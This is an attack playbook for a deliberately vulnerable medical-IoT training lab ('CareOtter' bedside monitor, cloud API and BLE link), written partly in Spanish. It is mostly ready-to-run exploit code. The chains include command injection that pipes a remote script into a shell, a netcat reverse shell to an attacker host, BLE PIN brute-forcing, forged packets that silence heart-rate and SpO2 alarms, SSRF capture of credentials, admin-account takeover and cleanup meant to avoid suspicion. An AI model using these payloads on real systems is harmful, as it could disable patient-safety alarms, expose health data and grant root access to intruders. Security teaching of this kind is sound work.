# CareOtter Attack Playbook

> **Single source of truth for operational attack chains.**
>
> This document contains step-by-step playbooks with concrete commands, payloads, and expected outputs. For vulnerability descriptions, CWE mappings, and remediation guidance, see [`CareOtter_IoT.md`](IoT/CareOtter_IoT.md).

---

## Table of Contents

- [Ground State](#ground-state)
- [Chain A — Remote Code Execution via Network](#chain-a--remote-code-execution-via-network)
- [Chain B — Patient Safety Attack via BLE](#chain-b--patient-safety-attack-via-ble)
- [Chain C — WiFi Credential Theft](#chain-c--wifi-credential-theft)
- [Chain D — Stack Disclosure via Format String](#chain-d--stack-disclosure-via-format-string)
- [Chain E — Full Device Compromise from BLE Proximity](#chain-e--full-device-compromise-from-ble-proximity)
- [Chain F — Cloud API Impersonation via Signature Interception](#chain-f--cloud-api-impersonation-via-signature-interception)
- [Alternative Path — Fallback `/initialize_iot`](#alternative-path--fallback-initialize_iot)
- [Vulnerability Checklist](#vulnerability-checklist)
- [Quick Reference — One-Liners](#quick-reference--one-liners)

---

## Ground State

Before any attack chain begins, the system is in the following state:

| Component | State |
|-----------|-------|
| Cloud API | SQLite empty, no users, `DEVICE_IP=""` |
| Bedside Monitor (Pi) | No WiFi, no `cloud_url`, BLE advertising as `CareOtter_HR` |
| DAI/ICD Implant | MAX30102 streaming I2C data to the Pi |
| Attacker position | **A** — Same network as Cloud API / **B** — BLE range only (~10–30 m) |

---

## Chain A — Remote Code Execution via Network

> **Vector:** IGP v4 (TCP :9999) · **Physical access:** No · **Prerequisites:** Network reachability to `192.168.2.1:9999`
> **Vulns:** Hardcoded token ([`I1`](IoT/CareOtter_IoT.md#i1)), Command injection ([`I9.1`](IoT/CareOtter_IoT.md#i91))

### Steps

```bash
# 1. Discover open IGP port
nmap -sV -p 9999 192.168.2.1

# 2. Extract hardcoded token from the binary
strings /path/to/careservice | grep -i otter
# → OtterMobile2026

# 3. Authenticate via IGP 0x02
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
print(igp(0x02, b'OtterMobile2026'))  # AUTH_SUCCESS
EOF

# 4. Inject shell command via IGP 0x06 (SET_NETWORK SSID field)
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
payload = b"' && curl http://192.168.2.100/r.sh | sh #"
print(igp(0x06, payload))
EOF
```

**Impact:** Root RCE on the bedside monitor.

---

## Chain B — Patient Safety Attack via BLE

> **Vector:** BLE GATT · **Physical access:** BLE range · **Prerequisites:** None
> **Vulns:** ManufacturerData leak ([`I3`](IoT/CareOtter_IoT.md#i3)), Hardcoded CSCP key ([`M1`](IoT/CareOtter_IoT.md#m1))

### Steps

```bash
# 1. Passive BLE scan to discover device and API URL from ManufacturerData
python3 -c "
import asyncio
from bleak import BleakScanner
async def scan():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'Found: {d.address}')
            print(f'ManufacturerData: {d.metadata.get(\"manufacturer_data\", {})}')
asyncio.run(scan())
"

# 2. Extract CSCP key from Android APK
dex2jar careotter_app.apk
jadx -d out careotter_app.apk
grep -r "careotter-key-16" out/

# 3. Forge malicious CSCP v1 packet (silences all alerts)
python3 << 'EOF'
import struct, zlib
from Crypto.Cipher import AES
KEY   = b"careotter-key-16"
MAGIC = 0xCAFE0DDA

def cscp_pack(bpm_min, bpm_max, spo2_min):
    plaintext = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b'\x00' * 13
    crc = zlib.crc32(plaintext) & 0xFFFFFFFF
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(plaintext)
    return struct.pack(">II", MAGIC, crc) + ct

pkt = cscp_pack(0, 255, 0)
print(f"Payload (hex): {pkt.hex()}")
# Write pkt to BLE characteristic 0xFF01 via nRF Connect or bleak
EOF
```

**Impact:** All clinical alarms silenced (bpm=0–255, spo2=0). Patient safety compromise.

---

## Chain C — WiFi Credential Theft

> **Vector:** IGP v4 or HTTP · **Physical access:** No · **Prerequisites:** Network reachability
> **Vulns:** Hardcoded token ([`I1`](IoT/CareOtter_IoT.md#i1)), PSK plaintext in API response ([`I6`](IoT/CareOtter_IoT.md#i6))

### Steps

```bash
# Via IGP v4
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())  # GET_NETWORK → contains PSK
EOF

# Via Cloud API (requires valid JWT obtained after fallback init)
curl -s http://192.168.2.2:5002/api/network \
  -H "Authorization: Bearer <JWT>"
# → field "raw" contains /etc/config/wireless with PSK
```

**Impact:** Hospital WiFi credentials exposed in plaintext.

---

## Chain D — Stack Disclosure via Format String

> **Vector:** IGP v4 · **Physical access:** No · **Prerequisites:** Network reachability
> **Vuln:** Format string bug ([`I9.2`](IoT/CareOtter_IoT.md#i92))

### Steps

```bash
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
# 0x05 requires no authentication
print(igp(0x05, b'%x.%x.%x.%x.%x'))
EOF
```

**Impact:** Stack frame addresses leaked. Useful for ASLR bypass in follow-up exploits.

---

## Chain E — Full Device Compromise from BLE Proximity

> **Vector:** BLE GATT (hidden provisioning service) · **Physical access:** BLE range · **Prerequisites:** None
> **Vulns:** Hidden service ([`P1`](IoT/CareOtter_IoT.md#p1)), No pairing ([`P2`](IoT/CareOtter_IoT.md#p2)), Hardcoded PIN ([`P3`](IoT/CareOtter_IoT.md#p3)), Shell injection ([`P4`](IoT/CareOtter_IoT.md#p4)), SSRF ([`P6`](IoT/CareOtter_IoT.md#p6)), Unauthenticated factory reset ([`P7`](IoT/CareOtter_IoT.md#p7))

### Steps

```python
import asyncio, json
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"
CONFIG  = "0000ff11-0000-1000-8000-00805f9b34fb"
AUTH    = "0000ff12-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(ADDRESS) as client:
        # 1. Brute-force PIN 1234 (P3)
        for pin in range(10000):
            pin_str = f"{pin:04d}"
            await client.write_gatt_char(AUTH, pin_str.encode())
            status = await client.read_gatt_char(AUTH)
            if b"authenticated" in status:
                print(f"[+] PIN: {pin_str}")
                break

        # 2. Read provisioning state
        state = json.loads(await client.read_gatt_char(CONFIG))
        print(f"cloud_url: {state['cloud_url']}")

        # 3. Attacker BECOMES the cloud (P6)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "cloud_set",
            "url": "http://192.168.2.100:5002"
        }).encode())

        # 4. Inject shell command via WiFi SSID (P4)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "wifi_set",
            "ssid": "'; curl http://192.168.2.100/r.sh | sh #",
            "psk": "irrelevant"
        }).encode())

        # 5. Wipe device (P7)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "factory_reset"
        }).encode())

asyncio.run(main())
```

**Impact:** Attacker-controlled cloud backend + root RCE + denial of clinical monitoring.

---

## Chain F — Cloud API Impersonation via Signature Interception

> **Vector:** BLE GATT + HTTP · **Physical access:** BLE range + network · **Prerequisites:** Bluetooth range to Pi, network reachability to real Cloud API
> **Vulns:** Hidden service ([`P1`](IoT/CareOtter_IoT.md#p1)), No pairing ([`P2`](IoT/CareOtter_IoT.md#p2)), Hardcoded PIN ([`P3`](IoT/CareOtter_IoT.md#p3)), Shell injection ([`P4`](IoT/CareOtter_IoT.md#p4)), SSRF + hardcoded signature ([`P6`](IoT/CareOtter_IoT.md#p6))

### FASE 1: Reconocimiento (30 segundos)

```bash
# Escaneo de puertos en la subnet
nmap -sV -p 5002,8081,9999 192.168.2.0/24

# Prueba login directo con credenciales por defecto
# → Debe FALLAR si la BD está limpia (clean-slate)
curl -s -X POST http://192.168.2.2:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}'
# → {"error":"Invalid username or password","code":"AUTH_FAIL"}

# Lectura de la pista de provisioning
curl -s http://192.168.2.2:5002/hint
# → plaintext hint about CareOtter Medical Service configuration software
```

### FASE 2: Descubrimiento BLE

```python
import asyncio
from bleak import BleakScanner

async def scan():
    devices = await BleakScanner.discover()
    for d in devices:
        if d.name == "CareOtter_HR":
            print(f"[+] Found: {d.address}")
            print(f"    RSSI: {d.rssi}")
            print(f"    ManufacturerData: {d.metadata.get('manufacturer_data', {})}")

asyncio.run(scan())
```

> **Vuln ref:** [`I3`](IoT/CareOtter_IoT.md#i3) — `ManufacturerData` expone la IP:puerto del Cloud API. En estado no provisionado es `0.0.0.0:0`.

### FASE 3: Enumeración GATT y descubrimiento del canal oculto

```python
import asyncio
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"

async def main():
    async with BleakClient(ADDRESS) as client:
        services = await client.get_services()
        for service in services:
            print(f"Service: {service.uuid}")
            for ch in service.characteristics:
                print(f"  Char: {ch.uuid} — {ch.properties}")

asyncio.run(main())
```

**Servicio oculto esperado:**
```
Service: 0000ff10-0000-1000-8000-00805f9b34fb  # NOT advertised
  Char: 0000ff11-... — ['read', 'write', 'notify']  # Provisioning Config
  Char: 0000ff12-... — ['read', 'write']            # Provisioning Auth
```

> **Vuln ref:** [`P1`](IoT/CareOtter_IoT.md#p1) — El servicio `0xFF10` no se anuncia en Advertising, pero es visible vía `discover_services()`.

### FASE 4: Bypass de autenticación BLE (PIN brute-force)

```python
import asyncio
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"
AUTH_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(ADDRESS) as client:
        auth_data = await client.read_gatt_char(AUTH_UUID)
        print(f"Auth status: {auth_data.decode()}")

        for pin in range(10000):
            pin_str = f"{pin:04d}"
            await client.write_gatt_char(AUTH_UUID, pin_str.encode())
            result = await client.read_gatt_char(AUTH_UUID)
            if b"authenticated" in result:
                print(f"[+] PIN cracked: {pin_str}")
                break

asyncio.run(main())
```

**Salida esperada:**
```
Auth status: b'unauthenticated'
[+] PIN cracked: 1234
```

> **Vuln ref:** [`P3`](IoT/CareOtter_IoT.md#p3) — PIN hardcoded `1234` en todos los dispositivos. Sin rate limiting.

### FASE 5: Lectura del estado de fábrica

```python
CONFIG_UUID = "0000ff11-0000-1000-8000-00805f9b34fb"

async def read_state(client):
    data = await client.read_gatt_char(CONFIG_UUID)
    print(data.decode())
```

**Respuesta esperada (no provisionado):**
```json
{
  "wifi_ssid": "",
  "wifi_psk": "",
  "cloud_url": "not_configured",
  "patient_username": "",
  "patient_password": "",
  "admin_username": "",
  "admin_password": "",
  "uptime_sec": 4821,
  "provision_expired": false
}
```

> **Vuln ref:** [`P2`](IoT/CareOtter_IoT.md#p2) — No requiere pairing BLE. Conexión + PIN crackeado = acceso total.

### FASE 6: Interceptación de la firma (Signature Interception)

#### 6A. Servidor falso del atacante

```python
# attacker_server.py
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/admin/device/register', methods=['POST'])
def capture():
    data = request.get_json()
    print("=" * 60)
    print("[CAPTURED REGISTRATION]")
    print(f"Signature: {data['signature']}")
    print(f"MAC:       {data['mac']}")
    print(f"Patient:   {data['patient']}")
    print(f"Admin:     {data['admin']}")
    print(f"Device IP: {data['device_ip']}")
    print("=" * 60)
    return jsonify({"status": "registered", "device_mac": data['mac']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)
```

#### 6B. Escritura de URL falsa vía BLE

```python
import json

async def redirect_to_attacker(client):
    # Configurar cuentas para que el Pi las envíe al atacante
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "patient_set",
        "username": "alice_patient",
        "password": "super_secret_patient_123"
    }).encode())

    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "admin_set",
        "username": "dr_bob_admin",
        "password": "super_secret_admin_456"
    }).encode())

    # cloud_set dispara _send_registration_to_cloud() automáticamente
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "cloud_set",
        "url": "http://192.168.2.100:5002"
    }).encode())
```

#### 6C. Captura en servidor del atacante

```
============================================================
[CAPTURED REGISTRATION]
Signature: CareOtterFactorySig2026
MAC:       B8:27:EB:12:34:56
Patient:   {'username': 'alice_patient', 'password': 'super_secret_patient_123'}
Admin:     {'username': 'dr_bob_admin', 'password': 'super_secret_admin_456'}
Device IP: 192.168.2.1
============================================================
```

> **Vuln ref:** [`P6`](IoT/CareOtter_IoT.md#p6) — `cloud_set` acepta cualquier URL. El Pi auto-envía `DEVICE_SIGNATURE` + credenciales a esa URL.

### FASE 7: Replay al Cloud API real (Backend Takeover)

```bash
REAL_CLOUD="http://192.168.2.2:5002"

curl -s -X POST "$REAL_CLOUD/admin/device/register" \
  -H "Content-Type: application/json" \
  -d '{
    "signature": "CareOtterFactorySig2026",
    "mac": "B8:27:EB:12:34:56",
    "patient": {
      "username": "alice_patient",
      "password": "super_secret_patient_123"
    },
    "admin": {
      "username": "dr_evil_ADMIN",
      "password": "pwned_666!!!"
    },
    "device_ip": "192.168.2.1"
  }'
```

**Respuesta:**
```json
{"status": "registered", "device_mac": "B8:27:EB:12:34:56"}
```

> **Vuln:** Firma `CareOtterFactorySig2026` global e idéntica. No está vinculada al MAC.

### FASE 8: Acceso al panel de administración

```bash
# Login con cuenta admin inyectada
TOKEN=$(curl -s -X POST "$REAL_CLOUD/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"dr_evil_ADMIN","password":"pwned_666!!!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Listar pacientes
curl -s "$REAL_CLOUD/api/admin/patients" \
  -H "Authorization: Bearer $TOKEN"

# Leer vitales históricos
curl -s "$REAL_CLOUD/api/admin/records" \
  -H "Authorization: Bearer $TOKEN"

# Silenciar alarmas clínicas
curl -s -X POST "$REAL_CLOUD/api/admin/thresholds" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0,"spo2_max":100}'
```

### FASE 9: Remote Code Execution (RCE) vía BLE

```python
async def rce_payload(client):
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "wifi_set",
        "ssid": "'; curl http://192.168.2.100/r.sh | sh #",
        "psk": "irrelevant"
    }).encode())

    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "reboot"
    }).encode())
```

**En el servidor del atacante (`r.sh`):**
```bash
#!/bin/bash
nc -e /bin/sh 192.168.2.100 4444
```

```bash
# Atacante escucha
nc -lvnp 4444
# → Conexión entrante como root desde el Pi
```

> **Vuln ref:** [`P4`](IoT/CareOtter_IoT.md#p4) — `wifi_set` interpola `ssid` en `os.system()` sin sanitizar.

### FASE 10: Persistencia y limpieza

```python
async def cleanup(client):
    # Restaurar cloud_url original para no levantar sospechas
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "cloud_set",
        "url": "http://hospital-cloud.local:5002"
    }).encode())
```

### Timeline Chain F

| Tiempo | Acción |
|--------|--------|
| 0:00 | `nmap` o BLE scan |
| 0:15 | GATT service discovery → `0xFF10` encontrado |
| 0:30 | PIN brute-force `1234` |
| 0:45 | Lee estado: `cloud_url: not_configured` |
| 1:00 | Escribe `patient_set`, `admin_set`, `cloud_set` → auto-registro |
| 1:15 | Captura firma + credenciales en servidor falso |
| 1:30 | Replay a Cloud API real → admin account created |
| 1:45 | Login como admin, exfiltración de datos |
| 2:00 | `wifi_set` con shell injection → RCE |
| 2:15 | Reverse shell como root |

**Tiempo total:** ~2 minutos con script automatizado.

---

## Alternative Path — Fallback `/initialize_iot`

Si el atacante **no descubre el BLE** pero tiene acceso de red:

```bash
curl -s -X POST http://192.168.2.2:5002/initialize_iot
```

**Respuesta (BD vacía):**
```json
{
  "status": "initialized",
  "note": "Fallback mode — default accounts created",
  "admin": {"username": "admin", "password": "CareOtter2026!"},
  "patient": {"username": "patient", "password": "patient123"}
}
```

Ahora puede loguearse directamente con `admin`/`CareOtter2026!`. Este es el **modo fácil** del lab. Chain F es el **modo difícil/realista**.

---

## Vulnerability Checklist

| Paso | Vuln | CWE | Severidad | Documentación |
|------|------|-----|-----------|---------------|
| Descubrir `0xFF10` | P1 — Hidden Service | CWE-200 | Info | [`IoT doc`](IoT/CareOtter_IoT.md#p1) |
| Sin pairing | P2 — No BLE Pairing | CWE-287 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p2) |
| PIN `1234` | P3 — Hardcoded PIN | CWE-798 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#p3) |
| Shell injection | P4 — Command Injection | CWE-78 | Crítica | [`IoT doc`](IoT/CareOtter_IoT.md#p4) |
| PSK plaintext | P5 — Plaintext Storage | CWE-312 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p5) |
| SSRF + firma | P6 — SSRF + Hardcoded Secret | CWE-918, CWE-798 | Crítica | [`IoT doc`](IoT/CareOtter_IoT.md#p6) |
| Factory reset | P7 — Missing Auth | CWE-306 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#p7) |
| Canal abierto | P8 — Missing Temporal Lockout | CWE-613 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p8) |
| Hardcoded token | I1 — Hardcoded IGP Token | CWE-798 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#i1) |
| Global auth state | I7 — Insecure Data Transfer | CWE-362 / CWE-613 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#i7) |

---

## Quick Reference — One-Liners

```bash
# IGP helper (Python)
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(ip, cmd, payload=b''):
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection((ip, 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)
ip = '192.168.2.1'
print(igp(ip, 0x01))                        # SYS_INFO
print(igp(ip, 0x02, b'OtterMobile2026'))    # AUTHENTICATE
print(igp(ip, 0x05, b'%x.%x.%x.%x'))       # FORMAT STRING (no auth)
print(igp(ip, 0x03))                        # GET_NETWORK → PSK
print(igp(ip, 0x0C, b"x'; touch /tmp/pwned #"))  # CMD INJECTION
EOF

# Unauthenticated threshold overwrite (HTTP)
curl -X POST http://192.168.2.1:8081/thresholds \
     -H "Content-Type: application/json" \
     -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}'

# BLE ManufacturerData scan
python3 -c "
import asyncio
from bleak import BleakScanner
async def scan():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'ManufacturerData: {d.metadata.get(\"manufacturer_data\", {})}')
asyncio.run(scan())
"

# Cloud API — fallback initialization
curl -X POST http://192.168.2.2:5002/initialize_iot

# Cloud API — login with default credentials (after fallback)
curl -X POST http://192.168.2.2:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}'

# Cloud API — hint endpoint (unauthenticated)
curl -s http://192.168.2.2:5002/hint

# Cloud API — signature-based registration
curl -X POST http://192.168.2.2:5002/admin/device/register \
  -H "Content-Type: application/json" \
  -d '{"signature":"CareOtterFactorySig2026","mac":"B8:27:EB:XX:XX:XX","patient":{"username":"p","password":"p"},"admin":{"username":"a","password":"a"},"device_ip":"192.168.2.1"}'
```


---

## Reproducibility Tracker

> Usa esta tabla para registrar el resultado real de cada prueba en el laboratorio. **No repite los comandos** — están en las secciones anteriores. Solo anota si funcionó según lo documentado y qué observaste.

```markdown
### Fecha de sesión: ___________

| ID | Vuln | Estado | Output esperado (según docs) | Output real observado | ¿Necesita pulir docs/código? |
|----|------|--------|------------------------------|----------------------|------------------------------|
| IGP-01 | Hardcoded credential | ⬜ | AUTH_SUCCESS con OtterMobile2026 | | |
| IGP-01b | Token incorrecto | ⬜ | AUTH_FAIL | | |
| IGP-02 | WiFi PSK disclosure | ⬜ | option key en plaintext | | |
| IGP-03 | Integer underflow → BOF | ⬜ | Crash o comportamiento anómalo | | |
| IGP-04 | Format string | ⬜ | Stack leak en respuesta | | |
| IGP-05 | Shell injection | ⬜ | Archivo creado en RPi | | |
| IGP-06 | Global auth state | ⬜ | Datos sin autenticar en nueva TCP | | |
| IGP-07 | Format string (therapy) | ⬜ | Stack leak en careotter_events.log | | |
| IGP-08 | Command injection (alert) | ⬜ | Archivo creado en RPi | | |
| API-01 | Weak JWT secret | ⬜ | Token forjado aceptado | | |
| API-02 | WiFi PSK via REST | ⬜ | Campo .raw con PSK | | |
| API-03 | Format string proxy | ⬜ | Stack leak del careservice | | |
| API-04 | Flask debug / RCE | ⬜ | Werkzeug debugger expuesto | | |
| API-05 | Weak password storage | ⬜ | Hash SHA-256 sin salt en SQLite | | |
| API-06 | Partial role checks | ⬜ | Paciente accede a admin endpoint | | |
| API-07 | Unauthenticated /hint | ⬜ | Pista recibida sin auth | | |
| API-08 | Fallback /initialize_iot | ⬜ | Usuarios por defecto creados | | |
| API-09 | Signature registration | ⬜ | Admin/patient creados vía firma | | |
| BLE-01 | Missing BLE pairing | ⬜ | App conecta sin verificar MAC | | |
| BLE-02 | Unencrypted BLE channel | ⬜ | BPM/SpO₂ en plaintext (Wireshark) | | |
| BLE-03 | Plaintext external storage | ⬜ | Vitales en /sdcard/*.log | | |
| BLE-04 | Hidden diagnostic panel | ⬜ | Panel DIAG accesible | | |
| BLE-05 | Unvalidated GATT writes | ⬜ | Dispositivo acepta sin validar | | |
| BLE-06 | CSCP key leak | ⬜ | careotter-key-16 expuesta | | |
| BLE-07 | Threshold forging (M3) | ⬜ | Umbrales letales aplicados | | |
| BLE-08 | Hidden provisioning service | ⬜ | UUID 0xFF10 visible | | |
| BLE-09 | Factory PIN brute force | ⬜ | PIN 1234 aceptado | | |
| BLE-10 | WiFi PSK extraction | ⬜ | wifi_psk en plaintext | | |
| BLE-11 | Shell injection (provisioning) | ⬜ | Archivo creado en RPi | | |
| BLE-12 | SSRF via cloud_set | ⬜ | Pi envía registro a servidor atacante | | |
| BLE-13 | Unauthenticated factory reset | ⬜ | Reset sin confirmación | | |
| BLE-14 | Channel never expires | ⬜ | Canal activo tras 30 min | | |
```

**Leyenda:**
- ⬜ = No probado aún
- ✅ = Funciona exactamente como documentado
- ❌ = No funciona / output diferente al documentado
- ⚠️ = Funciona parcialmente o requiere condiciones adicionales

---

## Quick Reference — IPs y Puertos

| Servicio | IP | Puerto | Protocolo |
|----------|-----|--------|-----------|
| RPi Ethernet | `192.168.2.1` | — | — |
| PC Ethernet | `192.168.2.2` | — | — |
| Cloud API (Docker) | `192.168.2.2` | `5002` | HTTP |
| Medical Sensor | `192.168.2.1` | `8081` | HTTP |
| IGP v4 | `192.168.2.1` | `9999` | TCP binary |
| BLE | — | — | GATT (`CareOtter_HR`) |
